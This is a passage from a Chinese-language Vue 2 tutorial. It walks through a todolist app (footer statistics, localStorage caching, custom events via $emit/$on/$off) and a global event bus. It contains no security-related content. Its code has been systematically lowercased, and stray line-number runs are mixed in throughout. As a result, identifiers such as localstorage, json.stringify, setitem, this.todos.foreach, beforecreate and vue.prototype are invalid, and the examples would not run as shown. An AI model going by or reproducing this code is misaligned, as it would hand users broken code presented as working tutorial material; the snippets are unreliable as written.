"deletetodo"],\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\ntodoitem.vue：\n\n<template>\n  <li>\n    <label>\n      <input\n        type="checkbox"\n        :checked="todoitem.done"\n        @change="handlecheck(todoitem.id)"\n      />\n      <span>{{ todoitem.title }}</span>\n    </label>\n    <button class="btn btn-danger" @click="handledelete(todoitem.id)">\n      删除\n    </button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "todoitem",\n  props: ["todoitem", "checktodo", "deletetodo"],\n  methods: {\n    handlecheck(id) {\n      if (!id) return;\n      // 调用app传来的方法，勾选某一项\n      this.checktodo(id);\n    },\n    handledelete(id) {\n      if (!id) return;\n      if (confirm("确实删除吗？")) {\n        // 调用app传来的方法，删除某一项\n        this.deletetodo(id);\n      }\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# 4.5 底部统计\n\n这一节要完成“全部todo数量统计”、“已完成todo数量统计”、“全部或取消全部勾选todo”、“清除已完成的todo”。前两个需求可以使用计算属性，第三个需求可以使用:checked和@change来完成，最后一个需求更简单直接让父组件的数据过滤。\n\napp.vue：\n\n<template>\n  <div class="todo-container">\n    <addtodo :addtodo="addtodo"></addtodo>\n    <todomain\n      :todos="todos"\n      :checktodo="checktodo"\n      :deletetodo="deletetodo"\n    ></todomain>\n    \x3c!-- 将checkalltodo和clearalltodo传递给totaltodo使用 --\x3e\n    <totaltodo\n      :todos="todos"\n      :checkalltodo="checkalltodo"\n      :clearalltodo="clearalltodo"\n    ></totaltodo>\n  </div>\n</template>\n\n<script>\nimport addtodo from "./components/addtodo.vue";\nimport todomain from "./components/todomain.vue";\nimport totaltodo from "./components/totaltodo.vue";\n\nexport default {\n  name: "app",\n  components: {\n    addtodo,\n    todomain,\n    totaltodo,\n  },\n  data() {\n    return {\n      todos: [\n        { id: "001", title: "吃饭", done: true },\n        { id: "002", title: "学习", done: false },\n        { id: "003", title: "游戏", done: false },\n      ],\n    };\n  },\n  methods: {\n    // 上两节内容\n    addtodo(item) {\n      this.todos.unshift(item);\n    },\n    // 上一节内容\n    checktodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    // 上一节内容\n    deletetodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n    // 这一节内容，勾选全部todo或者取消勾选全部todo\n    checkalltodo(done) {\n      this.todos.foreach((item) => (item.done = done));\n    },\n    // 这一节内容，清除已完成的todo\n    clearalltodo() {\n      this.todos = this.todos.filter((item) => !item.done);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\ntotaltodo.vue：\n\n<template>\n  <div class="todo-footer" v-show="total">\n    <label>\n      <input type="checkbox" :checked="isall" @change="checkall" />\n    </label>\n    <span>\n      <span>已完成{{ donetotal }}</span> / 全部{{ total }}\n    </span>\n    <button class="btn btn-danger" @click="clearall">清除已完成任务</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "totaltodo",\n  props: ["todos", "checkalltodo", "clearalltodo"],\n  computed: {\n    // 计算出全部todo的数量\n    total() {\n      return this.todos.length;\n    },\n    // 计算出已完成的todo的数量\n    donetotal() {\n      // 使用reduce进行统计，accumulator是累计器，curritem是当前操作的项\n      const count = this.todos.reduce((accumulator, curritem) => {\n        // 只要当前操作的项是已完成的todo，将让累计器加1\n        return accumulator + (curritem.done ? 1 : 0);\n      }, 0);\n      return count;\n    },\n    // 判断是否全部勾选\n    isall() {\n      return this.total > 0 && this.total === this.donetotal;\n    },\n  },\n  methods: {\n    checkall(e) {\n    // 去修改app里的todos所有项的done字段，全部勾选or全部取消\n      this.checkalltodo(e.target.checked);\n    },\n    clearall() {\n    // 清空app里的todos已完成的todo\n      this.clearalltodo();\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n其实上面totaltodo.vue的checkbox还有优化的余地，让它勾选的初识化状态与change事件进行合并，也就是让v-model搭配计算属性的getter/setter。在checkbox初始化时，走计算属性isall的getter；当checkbox勾选或取消勾选时，走计算属性isall的setter。\n\n<template>\n  <div class="todo-footer" v-show="total">\n    <label>\n      <input type="checkbox" v-model="isall" />\n    </label>\n    <span>\n      <span>已完成{{ donetotal }}</span> / 全部{{ total }}\n    </span>\n    <button class="btn btn-danger" @click="clearall">清除已完成任务</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "totaltodo",\n  props: ["todos", "checkalltodo", "clearalltodo"],\n  computed: {\n    total() {\n      return this.todos.length;\n    },\n    donetotal() {\n      const count = this.todos.reduce((accumulator, curritem) => {\n        return accumulator + (curritem.done ? 1 : 0);\n      }, 0);\n      return count;\n    },\n    // 计算属性isall搭配v-model，让checkbox初始化时走getter，值变化时让app里的所有todo都勾选or取消勾选上\n    isall: {\n      get() {\n        return this.total > 0 && this.total === this.donetotal;\n      },\n      set(val) {\n        this.checkalltodo(val);\n      },\n    },\n  },\n  methods: {\n    clearall() {\n      this.clearalltodo();\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 组件化编码流程：\n    1. 拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。\n    2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用。\n       * 一个组件在用：放在组件自身即可。\n       * 一些组件在用：放在它们共同的父组件上。（状态提升）\n    3. 实现交互：从绑定事件开始。\n 2. props适用于：\n    1. 父组件===>子组件 通信\n    2. 子组件===>父组件 通信（要求父组件先给子组件传一个函数，修改数据）\n 3. 使用v-model时要切记：v-model绑定的值不能是props传递过来的值，因为props是只读的。\n 4. props传过来的若是对象类型的值，修改对象中的属性时vue不会报错，但不推荐这样做。\n\n----------------------------------------\n\n\n# 4.6 todolist本地缓存\n\n浏览器缓存有localstorage和sessionstorage，它们大概支持5m大小的内容。一直存在的缓存是localstorage，浏览器关闭后清除缓存的是sessionstorage。它们的api是一样的：setitem()新增或修改一条、getitem()读取一条、removeitem()删除一条、clear()清空所有。特别注意，setitem()在存储非字符串数据时，会自动将它转为字符串，如果要存对象类型的数据，先手动使用json.stringify(obj)进行转换。\n\n关于localstorage：\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n</head>\n<body>\n    <h2>localstorage</h2>\n    <button onclick="savedata()">保存一份localstorage</button>\n    <button onclick="readdata()">读取一份localstorage</button>\n    <button onclick="deletedata()">删除一份localstorage</button>\n    <button onclick="deletealldata()">清空所有localstorage</button>\n    <script type="text/javascript">\n        function savedata() {\n            // 添加or修改一条localstorage\n            localstorage.setitem(\'name\', \'张三\');\n            localstorage.setitem(\'age\', 18);\n            const person = { name: \'李四\', age: 20 }\n            // 对象要先转成json字符串，因为setitem会将非字符串的值转为字符串\n            localstorage.setitem(\'person\', json.stringify(person));\n        }\n        function readdata() {\n            // 读取一条localstorage\n            console.log(\'name：\', localstorage.getitem(\'name\'));\n            console.log(\'age：\', localstorage.getitem(\'age\'));\n            const result = localstorage.getitem(\'person\')\n            // 将json字符串转为对象\n            console.log(\'person：\', json.parse(result));\n        }\n        function deletedata() {\n            // 移除一条localstorage\n            localstorage.removeitem(\'name\');\n        }\n        function deletealldata() {\n            // 清空所有localstorage\n            localstorage.clear();\n        }\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n在前面几节的todolist，每次刷新页面，数据都是固定写死的。我们可以使用localstorage或sessionstorage进行浏览器缓存，在todolist我们需要使用监视属性对todos进行监视。\n\n<template>\n  <div class="todo-container">\n    <addtodo :addtodo="addtodo"></addtodo>\n    <todomain\n      :todos="todos"\n      :checktodo="checktodo"\n      :deletetodo="deletetodo"\n    ></todomain>\n    <totaltodo\n      :todos="todos"\n      :checkalltodo="checkalltodo"\n      :clearalltodo="clearalltodo"\n    ></totaltodo>\n  </div>\n</template>\n\n<script>\nimport addtodo from "./components/addtodo.vue";\nimport todomain from "./components/todomain.vue";\nimport totaltodo from "./components/totaltodo.vue";\n\nexport default {\n  name: "app",\n  components: {\n    addtodo,\n    todomain,\n    totaltodo,\n  },\n  data() {\n    return {\n      // 初始化时读取localstorage，没读取到就用[]\n      todos: json.parse(localstorage.getitem("todos")) || [],\n    };\n  },\n  watch: {\n    todos: {\n      // 开启深度监视，能监视到done字段\n      deep: true,\n      handler(value) {\n        // todos数据变化时，将新数据存储到localstorage里\n        const jsonstr = json.stringify(value);\n        localstorage.setitem("todos", jsonstr);\n      },\n    },\n  },\n  methods: {\n    addtodo(item) {\n      this.todos.unshift(item);\n    },\n    checktodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    deletetodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n    checkalltodo(done) {\n      this.todos.foreach((item) => (item.done = done));\n    },\n    clearalltodo() {\n      this.todos = this.todos.filter((item) => !item.done);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\n\n# 五、自定义事件和全局事件总线\n\n\n# 5.1 绑定自定义事件\n\n在上一章里，我们使用了状态提升来让平级的组件进行通信。其中有一个重要环节，那就是子组件访问父组件。具体的，父组件通过props传递给子组件一个函数（传的是引用，函数本身还存在于父组件），在需要进行子组件访问父组件时，子组件内部就调用该函数（携带新数据），以达到子组件访问父组件的目的（子组件调用该函数时，将新数据传递给了该函数本身所在的父组件）。\n\n这个重要环节最核心的就是那个传递的“函数”，其实我们可以用“自定义事件”来替代这一步骤。不用传递函数，只需要在绑定自定义事件时把事件回调函数留给父组件，然后让子组件内部去触发事件（触发后，底层会调用回调函数），这就能达到子组件访问父组件的目的（触发时携带新数据，通过事件回调函数传递给父组件）。\n\n具体的，我们在父组件中给子组件标签里，使用v-on来绑定自定义事件，该事件的回调函数写在父组件的methods里，在子组件想访问（修改）父组件的存储数据时，让子组件内部使用$emit去触发那个自定义事件，那么父组件里的那个回调函数就会被调用（达到子访问父的目的）。\n\napp.vue：\n\n<template>\n  <div class="outer">\n    <h2>父组件展示信息：{{ info }}</h2>\n    \x3c!-- school组件仍然使用状态提升 --\x3e\n    <school :schoolchange="schoolchange" />\n    \x3c!-- student组件使用绑定自定义事件 --\x3e\n    <student @changeinfo="studentchange" />\n  </div>\n</template>\n\n<script>\nimport school from "./components/school.vue";\nimport student from "./components/student.vue";\nexport default {\n  name: "app",\n  components: {\n    school,\n    student,\n  },\n  data() {\n    return { info: "还未有人修改这里" };\n  },\n  methods: {\n    // 回调函数，给school使用\n    schoolchange(info) {\n      this.info = info;\n    },\n    // 回调函数，给student使用\n    studentchange(info) {\n      this.info = info;\n    },\n  },\n};\n<\/script>\n\n<style>\n.outer {\n  padding: 10px;\n  background-color: dimgray;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nschool.vue：\n\n<template>\n  <div class="school">\n    <h2>学校：{{ name }}</h2>\n    <h2>地址：{{ address }}</h2>\n    <button @click="showinfo">点击我，修改父组件展示信息</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "school",\n  // 状态提升，props需要接收schoolchange回调函数\n  props: ["schoolchange"],\n  data() {\n    return {\n      name: "武汉大学",\n      address: "武汉市武昌区珞珈山路",\n    };\n  },\n  methods: {\n    showinfo() {\n      // 调用schoolchange这个回调函数\n      this.schoolchange("这里被school子组件修改了");\n    },\n  },\n};\n<\/script>\n\n<style scoped>\n.school {\n  padding: 20px;\n  margin: 20px;\n  background-color: forestgreen;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nstudent.vue：\n\n<template>\n  <div class="student">\n    <h2>姓名：{{ name }}</h2>\n    <h2>年龄：{{ age }}</h2>\n    <button @click="showinfo">点击我，修改父组件展示信息</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "student",\n  data() {\n    return {\n      name: "张三",\n      age: 18,\n    };\n  },\n  methods: {\n    showinfo() {\n      // 并没有使用props接收函数。只是在这里触发自定义事件，父组件那边的回调函数会被调用，还能携带新数据\n      this.$emit("changeinfo", "这里被student子组件修改了");\n    },\n  },\n};\n<\/script>\n\n<style scoped>\n.student {\n  padding: 20px;\n  margin: 20px;\n  background-color: hotpink;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n这种方式简单来说就是，外部绑定事件，内部触发事件；触发时是携带了新数据，将新数据传递给了定义在外部的回调函数（事件内部运行机制）。这种方式不需要通过props进行函数的传递（即子组件也无需使用props接收），这比之前的方式更简便。\n\n绑定自定义事件除了上面这种@xxx写法，其实还有另一种写法，使用ref特殊属性标记子组件，然后在父组件mounted生命钩子里获取这个子组件实例，再使用子组件实例.$on(事件名, 回调函数)来绑定自定义事件。第二种写法会比较灵活，可以在异步操作之后绑定自定义事件。\n\n<template>\n  <div class="outer">\n    <h2>父组件展示信息：{{ info }}</h2>\n    <school :schoolchange="schoolchange" />\n    \x3c!-- 使用ref特殊属性进行标记，对子组件使用ref，获取的就是子组件实例vc --\x3e\n    <student ref="student" />\n  </div>\n</template>\n\n<script>\nimport school from "./components/school.vue";\nimport student from "./components/student.vue";\nexport default {\n  name: "app",\n  components: {\n    school,\n    student,\n  },\n  data() {\n    return { info: "还未有人修改这里" };\n  },\n  methods: {\n    schoolchange(info) {\n      this.info = info;\n    },\n    studentchange(info) {\n      this.info = info;\n    },\n  },\n  mounted() {\n    // 先通过ref获取到子组件的实例对象，再给子组件实例对象绑定自定义事件\n    this.$refs.student.$on("changeinfo", this.studentchange);\n  },\n};\n<\/script>\n\n<style>\n.outer {\n  padding: 10px;\n  background-color: dimgray;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# 5.2 解绑自定义事件\n\n在组件进行销毁（this.$destroy()）或者它的父组件进行销毁时，其组件里绑定的自定义事件会被删除，尽管这样有时候还是需要进行手动解绑自定义事件。\n\n<template>\n  <div class="outer">\n    <h2>父组件展示信息：{{ info }}</h2>\n    <school ref="school" />\n    <student ref="student" />\n    <button @click="offinfoschevent">解绑changeinfosch自定义事件</button\n    ><br /><br />\n    <button @click="offinfostuevent">解绑changeinfostu自定义事件</button>\n  </div>\n</template>\n\n<script>\nimport school from "./components/school.vue";\nimport student from "./components/student.vue";\nexport default {\n  name: "app",\n  components: {\n    school,\n    student,\n  },\n  data() {\n    return { info: "还未有人修改这里" };\n  },\n  methods: {\n    schoolchange(info) {\n      this.info = info;\n    },\n    studentchange(info) {\n      this.info = info;\n    },\n    offinfoschevent() {\n      // 解绑自定义事件changeinfosch\n      this.$refs.school.$off("changeinfosch");\n      // 同时解绑多个，解绑school里的xxx事件和yyy事件\n      // this.$refs.school.$off([\'xxx\', \'yyy\']);\n      // 同时解绑所有的，解绑school里的所有自定义事件\n      // this.$refs.school.$off();\n    },\n    offinfostuevent() {\n      // 解绑自定义事件changeinfostu\n      this.$refs.student.$off("changeinfostu");\n      // 同时解绑多个，解绑student里的xxx事件和yyy事件\n      // this.$refs.student.$off([\'xxx\', \'yyy\']);\n      // 同时解绑所有的，解绑student里的所有自定义事件\n      // this.$refs.student.$off();\n    },\n  },\n  mounted() {\n    // 给school绑定changeinfosch自定义事件\n    this.$refs.school.$on("changeinfosch", this.schoolchange);\n    // 给student绑定changeinfostu自定义事件\n    this.$refs.student.$on("changeinfostu", this.studentchange);\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n\n# 5.3 自定义事件注意点\n\n对子组件进行自定义事件的绑定，那自定义事件的回调函数一般写在父组件的methods里。如果使用this.$refs.xxx.$on(\'yyy\', function(){})，也就是将回调函数直接定义在了第二个参数里，那这个回调函数的this会指向子组件实例，因为是子组件触发的自定义事件。想要与methods方式一样，让this指向父组件实例，那么可以让第二个参数使用箭头函数。\n\n  mounted() {\n    // 给school绑定changeinfosch自定义事件\n    this.$refs.school.$on("changeinfosch", (info) => {\n      this.info = info;\n    });\n    // 给student绑定changeinfostu自定义事件\n    this.$refs.student.$on("changeinfostu", (info) => {\n      this.info = info;\n    });\n  },\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n如果在父组件里给子组件标签里使用v-on来绑定原生事件（前面都是绑定自定义事件），vue会认为你绑定的就是自定义事件。要解决这个问题，需要加上事件修饰符.native，让vue将这个事件绑定到子组件模板里的那个根元素上。\n\n<template>\n  <div class="outer">\n    <h2>父组件展示信息：{{ info }}</h2>\n    \x3c!-- 绑定一个原生事件。要达到原生的效果，必须加上.native事件修饰符 --\x3e\n    <student @click.native="showmsg" />\n  </div>\n</template>\n\n<script>\nimport student from "./components/student.vue";\nexport default {\n  name: "app",\n  components: {\n    student,\n  },\n  data() {\n    return { info: "还未有人修改这里" };\n  },\n  methods: {\n    showmsg() {\n      console.log(\'绑定了原生的点击事件\');\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 自定义事件是一种组件间通信的方式，适用于 子组件===>父组件。\n 2. 使用场景：a是父组件，b是子组件，b想给a传数据，那么就要在a中给b绑定自定义事件（事件的回调在a中）。\n 3. 绑定自定义事件：\n    1. 第一种方式，在父组件中：<student @xxx="yyy" />，xxx是自定义事件的名称，yyy是回调函数。\n    2. 第二种方式，在mounted生命钩子中：this.$refs.zzz.$on(\'xxx\', yyy)，xxx是自定义事件的名称，yyy是回调函数，zzz是子组件上的ref属性值。\n    3. 若想让自定义事件只触发一次，可以使用.once事件修饰符，或this.$refs.zzz.$once(\'xxx\', yyy)。\n 4. 触发自定义事件：this.$emit(\'xxx\', 数据)，xxx是自定义事件的名称。这个触发一般写在子组件里，从子组件传递数据给父组件 。\n 5. 解绑自定义事件：this.$off(\'xxx\')或this.$refs.zzz.$off(\'xxx\', yyy)，在子组件或者父组件里解绑。\n 6. 在父组件中可以为子组件绑定原生事件，但需要.native事件修饰符。\n 7. 注意：通过this.$refs.zzz.$on(\'xxx\', yyy)绑定自定义事件时，yyy回调函数要么配置在methods里（this自然指向父组件实例），要么直接定义在此处但要使用箭头函数（否则this会指向子组件实例，一般我们期望它指向父组件实例）。\n\n----------------------------------------\n\n\n# 5.4 todolist使用自定义事件\n\n在todolist案例中，父组件app、子组件addtodo、子组件todomain、子组件totaltodo、孙组件todoitem，我们在这一节要对app、addtodo和totaltodo进行改造，将“通过props传递函数”的方式改为“自定义事件”的方式，涉及孙组件这条线的旧方式我们暂时不动（在下一节会讲）。\n\napp.vue：\n\n<template>\n  <div class="todo-container">\n    \x3c!-- 将`:addtodo="addtodo"`改为自定义事件 --\x3e\n    <addtodo @addtodoevent="addtodo"></addtodo>\n    \x3c!-- 涉及到孙组件就不改动了 --\x3e\n    <todomain\n      :todos="todos"\n      :checktodo="checktodo"\n      :deletetodo="deletetodo"\n    ></todomain>\n    \x3c!-- 将`:checkalltodo="checkalltodo"`和`:clearalltodo="clearalltodo"`改为自定义事件 --\x3e\n    <totaltodo\n      :todos="todos"\n      @checkallevent="checkalltodo"\n      @clearallevent="clearalltodo"\n    ></totaltodo>\n  </div>\n</template>\n\n<script>\nimport addtodo from "./components/addtodo.vue";\nimport todomain from "./components/todomain.vue";\nimport totaltodo from "./components/totaltodo.vue";\n\nexport default {\n  name: "app",\n  components: {\n    addtodo,\n    todomain,\n    totaltodo,\n  },\n  data() {\n    return {\n      todos: json.parse(localstorage.getitem("todos")) || [],\n    };\n  },\n  watch: {\n    todos: {\n      deep: true,\n      handler(value) {\n        const jsonstr = json.stringify(value);\n        localstorage.setitem("todos", jsonstr);\n      },\n    },\n  },\n  methods: {\n    addtodo(item) {\n      this.todos.unshift(item);\n    },\n    checktodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    deletetodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n    checkalltodo(done) {\n      this.todos.foreach((item) => (item.done = done));\n    },\n    clearalltodo() {\n      this.todos = this.todos.filter((item) => !item.done);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\naddtodo.vue：\n\n<template>\n  <div class="todo-header">\n    <input\n      type="text"\n      placeholder="请输入你的任务名称，按回车键确认"\n      v-model.trim="title"\n      @keyup.enter="additem"\n    />\n  </div>\n</template>\n\n<script>\nimport { nanoid } from "nanoid";\nexport default {\n  name: "addtodo",\n  data() {\n    return {\n      title: "",\n    };\n  },\n  methods: {\n    additem() {\n      if (!this.title) return;\n      const item = { id: nanoid(), title: this.title, done: false };\n      // 删除props里的addtodo，然后在这里改为$emit触发自定义事件addtodoevent\n      this.$emit("addtodoevent", item);\n      this.title = "";\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\ntotaltodo.vue：\n\n<template>\n  <div class="todo-footer" v-show="total">\n    <label>\n      <input type="checkbox" v-model="isall" />\n    </label>\n    <span>\n      <span>已完成{{ donetotal }}</span> / 全部{{ total }}\n    </span>\n    <button class="btn btn-danger" @click="clearall">清除已完成任务</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "totaltodo",\n  props: ["todos"],\n  computed: {\n    total() {\n      return this.todos.length;\n    },\n    donetotal() {\n      const count = this.todos.reduce((accumulator, curritem) => {\n        return accumulator + (curritem.done ? 1 : 0);\n      }, 0);\n      return count;\n    },\n    isall: {\n      get() {\n        return this.total > 0 && this.total === this.donetotal;\n      },\n      set(val) {\n        // 删除props里的checkalltodo，然后在这里改为$emit触发自定义事件checkallevent\n        this.$emit("checkallevent", val);\n      },\n    },\n  },\n  methods: {\n    clearall() {\n      // 删除props里的clearalltodo，然后在这里改为$emit触发自定义事件clearallevent\n      this.$emit("clearallevent");\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\n\n# 5.5 全局事件总线\n\n给一个组件绑定和触发自定义事件，是可以在组件的外部或内部进行的。这是因为，在内部可以通过this获取组件实例，在外部可以通过this.$refs.xxx来获取组件实例，又因为组件实例可以通过__proto__访问原型上的$on()和$emit()，所以不管是在组件的外部或内部都能进行绑定和触发自定义事件。这一点非常重要，基本是这一章的核心思想了。\n\n那如果我们准备一个所有组件都能访问到的公共组件，那其他组件是不是都可以使用这个公共组件的$on()和$emit()了。\n\n我们让a组件访问公共组件的$on()，给这个公共组件绑定一个自定义事件，回调函数留给a组件；再让b组件去访问公共组件的$emit()，触发之前的同名自定义事件（携带新数据），这样b组件与a组件进行了单方面通信。反之亦然，a也能与b进行通信，那么实际上就是双方通信。那么再把范围扩大，那所有的组件之间都能进行互相通信了（任意组件间的通信）。\n\n但现在要考虑这个公共组件是谁，要存在于哪：\n\n * 我们明确一点，组件实例的__proto__指向的原型对象，是继承自vue.prototype的，这个在2.5 vuecomponent这节说过。那么组件实例通过__proto__访问到原型对象，该原型对象又通过继承关系访问到vue.prototype，就可以拿到$on()和$emit()。\n * 不要妄想直接通过vue.prototype.$on()和vue.prototype.$emit()来绑定自定义事件，你绑定给谁？还得是一个实例。那是vue实例vm还是某个组件实例vc呢？\n * 其实公共组件是vue实例vm。使用$on()和$emit()时，直接通过vm的__proto__拿就可以了；如果是一个单独的新组件实例，链路会长一点。\n * 公共组件是谁搞清楚了，那这个vm存在哪了？以前是用const vm=来接收它，在脚手架项目是没有这样的，可以在main.js给vue进行实例化时使用beforecreate生命钩子，将this存到vue.prototype，即vue.prototype.$bus = this。这个$bus就是这一节的全局事件总线。\n\nimport vue from \'vue\'\nimport app from \'./app.vue\'\n\nnew vue({\n  el: \'#app\',\n  render: h => h(app),\n  components: {\n    app\n  },\n  beforecreate() {\n    // 安装全局事件总线，所有组件都能访问到$bus，并且所有组件都能使\n    // 用到$bus的`$on()`和`$emit()`将自定义事件绑定到$bus身上\n    vue.prototype.$bus = this;\n  }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n我们用school和student来演示平级组件间使用全局事件总线进行互相通信。\n\napp.vue：\n\n<template>\n  <div class="outer">\n    <h2>这里是父组件，本例不会涉及到父组件</h2>\n    <school />\n    <student />\n  </div>\n</template>\n\n<script>\nimport school from "./components/school.vue";\nimport student from "./components/student.vue";\nexport default {\n  name: "app",\n  components: {\n    school,\n    student,\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nschool.vue：\n\n<template>\n  <div class="school">\n    <h2>school-info：{{ info }}</h2>\n    <h3>学校：{{ name }}</h3>\n    <h3>地址：{{ address }}</h3>\n    <button @click.stop="changeinfo">修改student组件展示信息</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "school",\n  data() {\n    return {\n      info: "school这里还未被修改",\n      name: "武汉大学",\n      address: "武汉市武昌区珞珈山路",\n    };\n  },\n  mounted() {\n    // 给$bus绑定一个自定义事件changeschoolevent，将回调函数updateinfo留在了school组件本地\n    this.$bus.$on("changeschoolevent", this.updateinfo);\n  },\n  beforedestroy(){\n    // 在本组件销毁前解绑之前绑定的自定义事件，否则当前组件销毁了，该事件一直存在\n    this.$bus.$off("changeschoolevent");\n  },\n  methods: {\n    updateinfo(info) {\n      this.info = info;\n    },\n    changeinfo() {\n      // 触发$bus上的changestudentevent事件，用以school对student的通信\n      this.$bus.$emit(\n        "changestudentevent",\n        "由school组件修改了student组件的展示信息"\n      );\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nstudent.vue：\n\n<template>\n  <div class="student">\n    <h2>student-info：{{ info }}</h2>\n    <h3>姓名：{{ name 